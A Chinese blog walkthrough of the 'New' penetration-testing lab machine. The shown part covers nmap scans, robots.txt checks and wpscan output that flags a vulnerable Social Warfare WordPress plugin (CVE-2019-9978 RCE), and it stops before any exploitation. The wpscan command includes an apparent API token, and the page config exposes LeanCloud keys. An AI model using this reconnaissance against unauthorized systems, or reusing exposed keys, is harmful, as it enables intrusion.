@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334 主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;tmp]└─# nmap -sn 192.168.2.0&#x2F;24             Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-02 15:31 CSTNmap scan report for 192.168.2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="New">
+<meta property="og:url" content="http://miao-sec.github.io/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/New/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334 主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;tmp]└─# nmap -sn 192.168.2.0&#x2F;24             Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-02 15:31 CSTNmap scan report for 192.168.2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/11.jpg">
+<meta property="article:published_time" content="2025-07-02T15:38:55.000Z">
+<meta property="article:modified_time" content="2025-07-02T15:41:00.797Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="wordpress">
+<meta property="article:tag" content="CVE-2019-9978">
+<meta property="article:tag" content="提权-sqlmap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/11.jpg">
+  
+  
+  
+  <title>New - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="New"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-02 23:38" pubdate>
+          2025年7月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">New</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p>
+<h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sn 192.168.2.0/24             <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 15:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00029s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00015s latency).<br>MAC Address: 08:00:27:B2:2E:24 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.00033s latency).<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.16 seconds<br></code></pre></td></tr></table></figure>
+<p>靶机IP地址：<code>192.168.2.43</code></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.43                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 15:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.00039s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.75 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22和80</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.43<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 15:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.0068s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-robots.txt: 1 disallowed entry <br>|_/wp-admin/<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-generator: WordPress 6.8.1<br>|_http-title: Hi Maze<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.79 seconds<br></code></pre></td></tr></table></figure>
+<p>发现网站下面存在两个目录<code>robots.txt</code>和<code>wp-admin</code></p>
+<h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sU --top-ports 100 192.168.2.43<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 16:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.00098s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 108.43 seconds<br></code></pre></td></tr></table></figure>
+<p>无开放的端口</p>
+<h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507021622727.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload><br>发现是使用<code>WordPress</code>搭建的网站</p>
+<p>同时在端口详细信息扫描时发现了两个目录<code>robots.txt</code>和<code>wp-admin</code>，依次访问查看</p>
+<ul>
+<li><p><code>robots.txt</code>：存在两个目录<code>/wp-admin</code>和<code>/wp-admin/admin-ajax.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.43/robots.txt             <br>User-agent: *<br>Disallow: /wp-admin/<br>Allow: /wp-admin/admin-ajax.php<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><code>wp-admin</code>：被重定向到了一个域名<code>new.dsz</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507021636705.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+</li>
+<li><p>访问<code>robots.txt</code>里面的路径<code>/wp-admin/admin-ajax.php</code>，显示<code>0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl  http://192.168.2.43/wp-admin/admin-ajax.php <br>0 <br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>追加域名<code>new.dsz</code>到<code>hosts</code>文件中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.2.43 new.dsz&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<p>再次访问<code>wp-admin</code>：进入到<code>WordPress</code>的管理界面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507021702185.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="1、wpscan扫描"><a href="#1、wpscan扫描" class="headerlink" title="1、wpscan扫描"></a>1、wpscan扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# wpscan --url http://new.dsz/ --api-token Jrh7ozpao7LtkyqVZwMeXCKeqJN0zHplyeG8SaQU124 -e u,vp<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.27<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[+] URL: http://new.dsz/ [192.168.2.43]<br>[+] Started: Wed Jul  2 21:11:29 2025<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.62 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] robots.txt found: http://new.dsz/robots.txt<br> | Interesting Entries:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found By: Robots Txt (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://new.dsz/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://new.dsz/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://new.dsz/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://new.dsz/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br> |  - http://new.dsz/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentytwentyfive<br> | Location: http://new.dsz/wp-content/themes/twentytwentyfive/<br> | Latest Version: 1.2 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2025-04-15T00:00:00.000Z<br> | Readme: http://new.dsz/wp-content/themes/twentytwentyfive/readme.txt<br> | Style URL: http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2<br> | Style Name: Twenty Twenty-Five<br> | Style URI: https://wordpress.org/themes/twentytwentyfive/<br> | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> | Confirmed By: Css Style In 404 Page (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating Vulnerable Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] social-warfare<br> | Location: http://new.dsz/wp-content/plugins/social-warfare/<br> | Last Updated: 2025-03-18T09:37:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 4.5.6<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By:<br> |  Urls In 404 Page (Passive Detection)<br> |  Comment (Passive Detection)<br> |<br> | [!] 8 vulnerabilities identified:<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Arbitrary Settings Update<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/32085d2d-1235-42b4-baeb-bc43172a4972<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978<br> |      - https://wordpress.org/support/topic/malware-into-new-update/<br> |      - https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/<br> |      - https://threatpost.com/wordpress-plugin-removed-after-zero-day-discovered/143051/<br> |      - https://twitter.com/warfareplugins/status/1108826025188909057<br> |      - https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Remote Code Execution (RCE)<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618<br> |      - https://www.webarxsecurity.com/social-warfare-vulnerability/<br> |<br> | [!] Title: Social Warfare &lt; 4.3.1 - Subscriber+ Post Meta Deletion<br> |     Fixed <span class="hljs-keyword">in</span>: 4.3.1<br> |     References:<br> |      - https://wpscan.com/vulnerability/5116068f-4b84-42ad-a88d-03e46096b41c<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0402<br> |<br> | [!] Title: Social Warfare &lt; 4.4.0 - Post Meta Deletion via CSRF<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.0<br> |     References:<br> |      - https://wpscan.com/vulnerability/7140abf5-5966-4361-bd51-ee29d3071a30<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0403<br> |<br> | [!] Title: Social Sharing Plugin - Social Warfare &lt; 4.4.4 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.4<br> |     References:<br> |      - https://wpscan.com/vulnerability/ab221b58-369e-4010-ae36-be099b2f4c9b<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4842<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f5b9aff-0833-4887-ae59-df5bc88c7f91<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6.2 - Authenticated(Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6.2<br> |     References:<br> |      - https://wpscan.com/vulnerability/26ad138e-990a-4401-84e4-ea694ccf6e7f<br> 